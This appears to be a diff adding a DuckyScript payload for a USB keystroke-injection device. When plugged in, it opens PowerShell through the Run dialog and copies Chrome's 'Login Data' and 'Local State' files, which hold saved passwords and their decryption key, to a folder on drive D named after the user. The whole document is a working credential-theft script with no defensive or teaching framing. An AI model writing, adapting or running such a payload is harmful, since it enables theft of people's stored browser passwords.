@@ -1,0 +1,17 @@
+DELAY 800
+GUI r
+DELAY 800
+STRING Powershell
+ENTER
+DELAY 800
+STRING New-Item -ItemType "directory" -Name "$env:UserName" -Path "d:\" -Force
+ENTER
+DELAY 1000
+STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data" -Destination "d:\$env:UserName\"
+ENTER
+DELAY 1000
+STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "d:\$env:UserName\"
+ENTER
+DELAY 5000
+STRING exit
+ENTER
